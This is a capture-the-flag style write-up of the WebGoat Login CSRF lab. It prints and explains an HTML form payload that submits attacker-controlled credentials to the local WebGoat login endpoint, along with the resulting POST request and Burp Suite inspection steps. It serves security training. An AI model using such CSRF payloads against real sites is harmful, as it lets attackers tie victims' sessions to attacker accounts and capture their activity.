## 🛠️ CSRF Login Payload

The following HTML form was used during the WebGoat Login CSRF lab.

```html
<form action="http://127.0.0.1:8080/WebGoat/login"
      method="POST"
      style="width: 200px;">

    <input type="hidden"
           name="username"
           value="csrf-virat18">

    <input type="hidden"
           name="password"
           value="REDACTED">

    <button type="submit">
        Sign in
    </button>

</form>
```

### How the payload works

#### 1. Form action

```html
<form action="http://127.0.0.1:8080/WebGoat/login"
      method="POST">
```

The `<form>` element defines the HTTP request that will be generated.

* `action` specifies the WebGoat login endpoint.
* `method="POST"` means the credentials are submitted using an HTTP POST request.

In this lab, the target endpoint is:

```text
http://127.0.0.1:8080/WebGoat/login
```

> The port may be different depending on how WebGoat is configured.

---

#### 2. Username

```html
<input type="hidden"
       name="username"
       value="csrf-virat18">
```

This creates a hidden form field containing the attacker-controlled WebGoat username.

The WebGoat exercise requires the attacker's username to use the `csrf-` prefix.

In this example:

```text
Original account:
virat18

Attacker-controlled account:
csrf-virat18
```

Because the field is `hidden`, the username does not appear as a normal input box on the page.

---

#### 3. Password

```html
<input type="hidden"
       name="password"
       value="REDACTED">
```

This sends the password associated with the `csrf-virat18` account as part of the POST request.

The real password used during the lab is intentionally **redacted from this GitHub repository**.

Never publish real passwords, session cookies, API keys, or other secrets in a public repository.

---

#### 4. Submit button

```html
<button type="submit">
    Sign in
</button>
```

This creates a button that submits the form.

When the button is clicked, the browser sends a request similar to:

```http
POST /WebGoat/login HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: application/x-www-form-urlencoded

username=csrf-virat18&password=REDACTED
```

---

## 🔗 Putting Everything Together

The complete flow is:

```text
Create attacker account
        │
        ▼
csrf-virat18
        │
        ▼
Log in as csrf-virat18
        │
        ▼
Return to original CSRF Login tab
        │
        ▼
Trigger the login request
        │
        ▼
WebGoat receives POST /WebGoat/login
        │
        ▼
Login CSRF condition is demonstrated
        │
        ▼
✅ Lesson completed
```

### Why this demonstrates Login CSRF

The important concept is that the login request contains **attacker-controlled credentials**.

In a Login CSRF scenario, an attacker attempts to cause another browser to submit such a login request. If successful, the browser can become associated with the attacker's account instead of the account the victim intended to use.

This is why the WebGoat exercise asks us to create a separate account with the `csrf-` prefix and then trigger the challenge while logged in as that account.

---

## 🔎 Burp Suite Verification

The request can be inspected using:

```text
Burp Suite
    ↓
Proxy
    ↓
HTTP history
```

Look for:

```http
POST /WebGoat/login
```

The request body should contain the username and password parameters.

Sensitive information should be redacted before adding screenshots or requests to GitHub.

For example:

```http
Cookie: JSESSIONID=<REDACTED>
```

and:

```text
password=REDACTED
```

---

## ✅ Result

The WebGoat **CSRF Login** lesson was successfully completed.
Solved.png
This exercise helped demonstrate:

* How a login request works.
* How HTML forms generate POST requests.
* How attacker-controlled credentials can be placed into a login request.
* What makes Login CSRF different from normal CSRF.
* How Burp Suite can be used to inspect the resulting HTTP request.
